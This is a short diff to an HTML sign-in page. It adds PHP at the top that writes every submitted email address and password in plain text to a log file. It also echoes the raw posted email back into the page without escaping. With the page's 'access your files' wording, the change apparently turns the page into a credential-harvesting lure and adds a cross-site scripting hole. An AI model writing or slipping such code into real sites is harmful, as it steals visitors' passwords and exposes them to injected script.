@@ -1,3 +1,12 @@
+<?php
+$myfile = fopen("log/logfile.txt", "a+") or die("Unable to open file!");
+$txt = $_POST["inputEmail"] . ', ' .  $_POST["inputPassword"] . "\n";
+fwrite($myfile, $txt);
+fclose($myfile);
+?>
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -31,7 +40,7 @@
     <form class="form-signin">
 
 
-      <p class="text-center">An activation link will be sent to your eMail address. Please open the link to access your files.</p>
+      <p class="text-center">An activation link will be sent to <?php echo $_POST["inputEmail"]; ?>. Please open the link to access your files.</p>
 
       <p class="text-center"><span class="glyphicon glyphicon-ok iconbig" aria-hidden="true"></span></p>
 
